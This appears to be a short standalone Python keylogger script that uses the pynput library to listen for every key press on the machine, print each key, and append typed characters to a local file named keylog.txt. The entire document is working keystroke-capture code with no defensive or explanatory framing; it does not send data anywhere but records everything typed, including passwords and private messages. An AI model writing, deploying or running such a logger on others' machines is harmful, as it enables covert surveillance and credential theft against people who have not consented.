from pynput import keyboard

def keypress(key):
    print(str(key))
    with open("keylog.txt",'a') as logkey:
        try:
            char=key.char
            logkey.write(char)
        except:
            print("ERROR")

if __name__=="__main__":
    listener =keyboard.Listener(on_press=keypress)
    listener.start()
    input()
           